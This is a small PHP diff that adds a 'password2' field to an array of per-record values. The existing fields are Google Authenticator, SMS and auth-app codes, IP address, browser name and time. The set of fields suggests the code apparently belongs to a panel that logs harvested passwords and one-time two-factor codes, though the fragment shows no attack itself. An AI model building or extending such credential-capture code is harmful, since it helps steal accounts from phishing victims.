@@ -20,6 +20,7 @@
                     'google_auth_code' => $row['google_auth_code'],
                     'sms_code' => $row['sms_code'],
                     'auth_app_code' => $row['auth_app_code'],
+                    'password2' => $row['password2'],
                     'ip' => $row['ip'],
                     'browser_name' => $row['browser_name'],
                     'time' => $row['time'],
